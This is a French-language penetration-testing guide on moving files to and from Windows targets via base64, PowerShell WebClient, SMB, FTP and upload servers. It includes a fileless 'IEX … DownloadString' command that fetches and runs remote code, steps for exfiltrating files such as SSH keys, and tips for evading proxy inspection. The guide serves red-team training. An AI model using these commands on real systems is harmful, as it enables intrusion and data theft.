# Transferts de fichiers sous Windows

## Pourquoi

Windows reste le systeme d'exploitation le plus present dans les environnements d'entreprise. Savoir y transferer des fichiers, que ce soit pour deposer un outil ou exfiltrer une donnee, est indispensable lors d'un engagement. Le systeme offre plusieurs methodes natives, chacune avec ses avantages et ses limites face aux mecanismes de defense.

## Comment ca marche

### Encodage Base64 avec PowerShell

Quand aucun canal reseau direct n'est disponible (ou que le transfert doit etre discret), l'encodage base64 permet de convertir un fichier en chaine de caracteres, de la copier via le presse-papier ou un autre canal, puis de la decoder sur la cible.

**Cote attaquant (Exegol/Linux) :**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

**Cote cible (Windows) :**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<CHAINE_BASE64>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

{% hint style="warning" %}
La taille maximale d'une commande dans `cmd.exe` est de 8 191 caracteres. Pour les fichiers volumineux, cette methode devient impraticable. Certains shells web peuvent aussi planter avec des chaines trop longues.
{% endhint %}

### Telechargement via PowerShell (WebClient)

La classe `.NET WebClient` est disponible dans toutes les versions de PowerShell et permet des telechargements via HTTP, HTTPS et FTP.

| Methode | Description |
|---|---|
| `DownloadFile` | Telecharge un fichier vers un chemin local |
| `DownloadString` | Telecharge le contenu sous forme de texte (ideal pour l'execution en memoire) |
| `DownloadData` | Retourne un tableau de bytes |
| `OpenRead` | Retourne un flux de donnees |
| Variantes `*Async` | Memes fonctions, sans bloquer le thread |

**Telechargement classique :**

```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP_CIBLE>:8080/outil.exe','C:\Users\Public\outil.exe')
```

**Execution en memoire (fileless) :**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<IP_CIBLE>:8080/script.ps1')
```

Le script est execute directement en memoire, sans ecriture sur disque. C'est la methode privilegiee pour les charges PowerShell.

### Invoke-WebRequest

Disponible depuis PowerShell 3.0 (alias : `iwr`, `curl`, `wget`), cette cmdlet est plus lente que `WebClient` mais plus flexible.

```powershell
Invoke-WebRequest http://<IP_CIBLE>:8080/outil.ps1 -OutFile C:\Users\Public\outil.ps1
```

{% hint style="info" %}
Si Internet Explorer n'a jamais ete lance sur la machine, `Invoke-WebRequest` peut echouer. Le parametre `-UseBasicParsing` contourne ce probleme.
{% endhint %}

**Contournement SSL/TLS (certificat auto-signe) :**

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## En pratique

### Transfert via SMB

Le protocole SMB (port 445) est natif sur Windows et souvent autorise en reseau interne. Impacket permet de monter un serveur SMB en quelques secondes.

**Demarrer un serveur SMB (Exegol) :**

```bash
impacket-smbserver partage -smb2support /tmp/partage
```

**Copier un fichier depuis la cible :**

```powershell
copy \\<IP_CIBLE>\partage\outil.exe C:\Users\Public\outil.exe
```

{% hint style="warning" %}
Les versions recentes de Windows bloquent l'acces SMB sans authentification (guest access desactive par defaut). Il faut alors configurer des identifiants.
{% endhint %}

**Serveur SMB avec authentification :**

```bash
impacket-smbserver partage -smb2support /tmp/partage -username user -password pass
```

**Montage du partage depuis la cible :**

```powershell
net use n: \\<IP_CIBLE>\partage /user:user pass
copy n:\outil.exe C:\Users\Public\outil.exe
```

### Transfert via FTP

Le module Python `pyftpdlib` permet de deployer un serveur FTP minimal.

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

**Telechargement depuis PowerShell :**

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<IP_CIBLE>/fichier.txt','C:\Users\Public\fichier.txt')
```

**Via un fichier de commandes FTP (shell non interactif) :**

```cmd
echo open <IP_CIBLE> > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET fichier.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### Upload depuis la cible

**Encodage base64 pour exfiltration :**

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | Select Hash
```

**Decodage cote attaquant :**

```bash
echo "<CHAINE_BASE64>" | base64 -d > hosts
md5sum hosts
```

**Upload via serveur web (uploadserver) :**

```bash
pip3 install uploadserver
python3 -m uploadserver
```

L'upload s'effectue ensuite via `Invoke-RestMethod` ou un script PowerShell dedie (PSUpload.ps1) vers le endpoint `/upload` du serveur.

## Pieges et galeres

- `Invoke-WebRequest` est plus lent que `WebClient` et peut echouer si IE n'a pas ete initialise. Toujours avoir les deux methodes en tete.
- Le base64 ne convient pas aux fichiers de plus de quelques Ko. Au-dela, les limites de longueur de commande deviennent bloquantes.
- L'acces SMB sans authentification est bloque par defaut depuis Windows 10 1709 et Server 2019. Prevoir des identifiants.
- Certains proxys d'entreprise inspectent le contenu HTTP et bloquent les fichiers `.exe` ou `.ps1`. Renommer le fichier ou l'encoder peut aider.

## Retour terrain

Sur la majorite des missions internes, SMB via Impacket est la methode la plus fiable. Le port 445 est presque toujours ouvert entre les machines Windows, et le transfert est instantane. En revanche, pour les missions avec acces web uniquement (webshell), `PowerShell WebClient` avec un serveur HTTP Python est le reflexe de base.

## Memo express

| Methode | Commande cle |
|---|---|
| Base64 | `[IO.File]::WriteAllBytes(...)` / `[Convert]::ToBase64String(...)` |
| PowerShell HTTP | `(New-Object Net.WebClient).DownloadFile(...)` |
| Fileless | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| SMB | `impacket-smbserver` + `copy \\...\fichier` |
| FTP | `pyftpdlib` + `Net.WebClient` ou fichier de commandes |
| Upload | `uploadserver` + `Invoke-RestMethod` |

***
